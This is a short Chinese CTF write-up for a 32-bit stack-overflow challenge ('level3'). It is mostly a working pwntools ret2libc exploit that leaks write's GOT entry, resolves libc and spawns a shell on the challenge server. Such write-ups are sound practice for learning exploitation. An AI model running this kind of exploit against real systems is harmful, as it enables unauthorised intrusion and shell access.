检查安全机制是32位程序

![image-20201124194714204](https://static.hack1s.fun/images/2021/02/06/image-20201124194714204.png)

开启了nx

出现问题的函数

![image-20201124194928727](https://static.hack1s.fun/images/2021/02/06/image-20201124194928727.png)

就是read了0x100,而距离ebp只有0x88

直接ret2libc，内容比较基础和前面原理都一样就略了

```python
from pwn import *
from LibcSearcher import *

io = remote('node3.buuoj.cn',26517)
#io = process('./level3')
elf = ELF('./level3')

io.recvuntil('Input:\n')

payload = b'a'*0x88 + b'b'*4 + p32(elf.plt['write']) + p32(elf.sym['vulnerable_function']) + p32(1) + p32(elf.got['write']) + p32(4)
io.send(payload)

write_real = u32(io.recv(4))
libc = LibcSearcher('write',write_real)

libc_base = write_real - libc.dump('write')

payload = b'a'*0x88 + b'b'*4 + p32(libc_base + libc.dump('system')) + p32(elf.sym['vulnerable_function']) + p32(libc_base + libc.dump('str_bin_sh'))

io.send(payload)
io.interactive()
```

